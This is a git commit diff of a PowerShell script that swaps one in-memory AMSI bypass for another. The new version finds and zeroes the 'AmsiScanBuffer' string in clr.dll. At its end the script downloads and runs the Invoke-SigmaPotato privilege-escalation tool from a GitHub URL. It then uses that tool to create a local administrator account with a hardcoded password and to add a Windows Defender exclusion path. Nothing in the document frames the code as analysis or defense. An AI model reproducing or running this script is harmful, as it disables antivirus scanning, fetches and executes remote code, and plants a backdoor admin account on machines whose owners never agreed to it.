944628f3c6d7f2d9fb2de34ea2d19fde125352aa
farzas1 <eightfarzad@gmail.com>
2025-09-26 09:39:44 +0330

    Update mm.ps1

--- mm.ps1
+++ mm.ps1
@@ -1,131 +1,170 @@
-function MagicBypass {
+# Define Constants
+$PAGE_READONLY = 0x02
+$PAGE_READWRITE = 0x04
+$PAGE_EXECUTE_READWRITE = 0x40
+$PAGE_EXECUTE_READ = 0x20
+$PAGE_GUARD = 0x100
+$MEM_COMMIT = 0x1000
+$MAX_PATH = 260
 
-# Define named parameters
-param(
-    $InitialStart = 0x50000,
-    $NegativeOffset= 0x50000,
-    $MaxOffset = 0x1000000,
-    $ReadBytes = 0x50000
-)
+# Helper functions
+function IsReadable {
+    param ($protect, $state)
+    return ((($protect -band $PAGE_READONLY) -eq $PAGE_READONLY -or ($protect -band $PAGE_READWRITE) -eq $PAGE_READWRITE -or ($protect -band $PAGE_EXECUTE_READWRITE) -eq $PAGE_EXECUTE_READWRITE -or ($protect -band $PAGE_EXECUTE_READ) -eq $PAGE_EXECUTE_READ) -and ($protect -band $PAGE_GUARD) -ne $PAGE_GUARD -and ($state -band $MEM_COMMIT) -eq $MEM_COMMIT)
+}
 
-$APIs = @"
-using System;
-using System.ComponentModel;
-using System.Management.Automation;
-using System.Reflection;
-using System.Runtime.CompilerServices;
-using System.Runtime.InteropServices;
-using System.Text;
+function PatternMatch {
+    param ($buffer, $pattern, $index)
+    for ($i = 0; $i -lt $pattern.Length; $i++) {
+        if ($buffer[$index + $i] -ne $pattern[$i]) {
+            return $false
+        }
+    }
+    return $true
+}
 
-public class APIs {
-    [DllImport("kernel32.dll")]
-    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);
+if ($PSVersionTable.PSVersion.Major -gt 2) {
+    # Create module builder
+    $DynAssembly = New-Object System.Reflection.AssemblyName("Win32")
+    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule("Win32", $False)
 
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
+    # Define structs
+    $TypeBuilder = $ModuleBuilder.DefineType("Win32.MEMORY_INFO_BASIC", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
+    [void]$TypeBuilder.DefineField("BaseAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("AllocationBase", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("AllocationProtect", [Int32], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("RegionSize", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("State", [Int32], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("Protect", [Int32], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("Type", [Int32], [System.Reflection.FieldAttributes]::Public)
+    $MEMORY_INFO_BASIC_STRUCT = $TypeBuilder.CreateType()
 
-    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-   
-    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
-    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
+    # Define structs
+    $TypeBuilder = $ModuleBuilder.DefineType("Win32.SYSTEM_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
+    [void]$TypeBuilder.DefineField("wProcessorArchitecture", [UInt16], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("wReserved", [UInt16], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("dwPageSize", [UInt32], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("lpMinimumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("lpMaximumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("dwActiveProcessorMask", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("dwNumberOfProcessors", [UInt32], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("dwProcessorType", [UInt32], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("dwAllocationGranularity", [UInt32], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("wProcessorLevel", [UInt16], [System.Reflection.FieldAttributes]::Public)
+    [void]$TypeBuilder.DefineField("wProcessorRevision", [UInt16], [System.Reflection.FieldAttributes]::Public)
+    $SYSTEM_INFO_STRUCT = $TypeBuilder.CreateType()
 
-    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
-    public static int Dummy() {
-     return 1;
+    # P/Invoke Methods
+    $TypeBuilder = $ModuleBuilder.DefineType("Win32.Kernel32", "Public, Class")
+    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
+    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError")
+    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, "kernel32.dll", [Reflection.FieldInfo[]]@($SetLastError), @($True))
+
+    # Define [Win32.Kernel32]::VirtualProtect
+    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("VirtualProtect", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [bool], [Type[]]@([IntPtr], [IntPtr], [Int32], [Int32].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+
+    # Define [Win32.Kernel32]::GetCurrentProcess
+    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetCurrentProcess", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@(), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+
+    # Define [Win32.Kernel32]::VirtualQuery
+    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("VirtualQuery", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@([IntPtr], [Win32.MEMORY_INFO_BASIC].MakeByRefType(), [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+
+    # Define [Win32.Kernel32]::GetSystemInfo
+    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetSystemInfo", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [void], [Type[]]@([Win32.SYSTEM_INFO].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+
+    # Define [Win32.Kernel32]::GetMappedFileName
+    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("GetMappedFileName", "psapi.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [System.Text.StringBuilder], [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+
+    # Define [Win32.Kernel32]::ReadProcessMemory
+    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("ReadProcessMemory", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+
+    # Define [Win32.Kernel32]::WriteProcessMemory
+    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod("WriteProcessMemory", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
+
+    $Kernel32 = $TypeBuilder.CreateType()
+
+    $a = "Ams"
+    $b = "iSc"
+    $c = "anBuf"
+    $d = "fer"
+    $signature = [System.Text.Encoding]::UTF8.GetBytes($a + $b + $c + $d)
+    $hProcess = [Win32.Kernel32]::GetCurrentProcess()
+
+    # Get system information
+    $sysInfo = New-Object Win32.SYSTEM_INFO
+    [void][Win32.Kernel32]::GetSystemInfo([ref]$sysInfo)
+
+    # List of memory regions to scan
+    $memoryRegions = @()
+    $address = [IntPtr]::Zero
+
+    # Scan through memory regions
+    while ($address.ToInt64() -lt $sysInfo.lpMaximumApplicationAddress.ToInt64()) {
+        $memInfo = New-Object Win32.MEMORY_INFO_BASIC
+        if ([Win32.Kernel32]::VirtualQuery($address, [ref]$memInfo, [System.Runtime.InteropServices.Marshal]::SizeOf($memInfo))) {
+            $memoryRegions += $memInfo
+        }
+        # Move to the next memory region
+        $address = New-Object IntPtr($memInfo.BaseAddress.ToInt64() + $memInfo.RegionSize.ToInt64())
+    }
+
+    $count = 0
+
+    # Loop through memory regions
+    foreach ($region in $memoryRegions) {
+        # Check if the region is readable and writable
+        if (-not (IsReadable $region.Protect $region.State)) {
+            continue
+        }
+        # Check if the region contains a mapped file
+        $pathBuilder = New-Object System.Text.StringBuilder $MAX_PATH
+        if ([Win32.Kernel32]::GetMappedFileName($hProcess, $region.BaseAddress, $pathBuilder, $MAX_PATH) -gt 0) {
+            $path = $pathBuilder.ToString()
+            if ($path.EndsWith("clr.dll", [StringComparison]::InvariantCultureIgnoreCase)) {
+                # Scan the region for the pattern
+                $buffer = New-Object byte[] $region.RegionSize.ToInt64()
+                $bytesRead = 0
+                [void][Win32.Kernel32]::ReadProcessMemory($hProcess, $region.BaseAddress, $buffer, $buffer.Length, [ref]$bytesRead)
+                for ($k = 0; $k -lt ($bytesRead - $signature.Length); $k++) {
+                    $found = $True
+                    for ($m = 0; $m -lt $signature.Length; $m++) {
+                        if ($buffer[$k + $m] -ne $signature[$m]) {
+                            $found = $False
+                            break
+                        }
+                    }
+                    if ($found) {
+                        $oldProtect = 0
+                        if (($region.Protect -band $PAGE_READWRITE) -ne $PAGE_READWRITE) {
+                            [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
+                        }
+                        $replacement = New-Object byte[] $signature.Length
+                        $bytesWritten = 0
+                        [void][Win32.Kernel32]::WriteProcessMemory($hProcess, [IntPtr]::Add($region.BaseAddress, $k), $replacement, $replacement.Length, [ref]$bytesWritten)
+                        $count++
+                        if (($region.Protect -band $PAGE_READWRITE) -ne $PAGE_READWRITE) {
+                            [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $region.Protect, [ref]$oldProtect)
+                        }
+                    }
+                }
+            }
+        }
     }
 }
-"@
 
-Add-Type $APIs
-
-$InitialDate=Get-Date;
-
-$string = 'hello, world'
-$string = $string.replace('he','a')
-$string = $string.replace('ll','m')
-$string = $string.replace('o,','s')
-$string = $string.replace(' ','i')
-$string = $string.replace('wo','.d')
-$string = $string.replace('rld','ll')
-
-$string2 = 'hello, world'
-$string2 = $string2.replace('he','A')
-$string2 = $string2.replace('ll','m')
-$string2 = $string2.replace('o,','s')
-$string2 = $string2.replace(' ','i')
-$string2 = $string2.replace('wo','Sc')
-$string2 = $string2.replace('rld','an')
-
-$string3 = 'hello, world'
-$string3 = $string3.replace('hello','Bu')
-$string3 = $string3.replace(', ','ff')
-$string3 = $string3.replace('world','er')
-
-$Address = [APIS]::GetModuleHandle($string)
-[IntPtr] $funcAddr = [APIS]::GetProcAddress($Address, $string2 + $string3)
-
-$Assemblies = [appdomain]::currentdomain.getassemblies()
-$Assemblies |
-  ForEach-Object {
-    if($_.Location -ne $null){
-     $split1 = $_.FullName.Split(",")[0]
-     If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
-       $Types = $_.GetTypes()
-     }
-    }
-}
-
-$Types |
-  ForEach-Object {
-    if($_.Name -ne $null){
-     If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
-       $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
-     }
-    }
-}
-
-$Methods |
-  ForEach-Object {
-    if($_.Name -ne $null){
-     If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
-       $MethodFound = $_
-     }
-    }
-}
-
-[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
-[IntPtr] $Handle = [APIs]::GetCurrentProcess()
-$dummy = 0
-$ApiReturn = $false
-   
-:initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
-    [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
-    $ReadedMemoryArray = [byte[]]::new($ReadBytes)
-    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
-    for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
-     $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
-     [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
-     if ($PointerToCompare -eq $funcAddr) {
-       Write-Host "Found @ $($i)!"
-       [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
-       break initialloop
-     }
-    }
-}
-[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
-$buf = [IntPtr[]] ($DummyPointer)
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
-
-$FinishDate=Get-Date;
-$TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
-Write-Host "$TimeElapsed seconds"
-}
-MagicBypass
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
 Invoke-SigmaPotato -command "net user k kopq@123 /add"
 Invoke-SigmaPotato -command "net localgroup administrators k /add"
 Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"
+
 
 
 
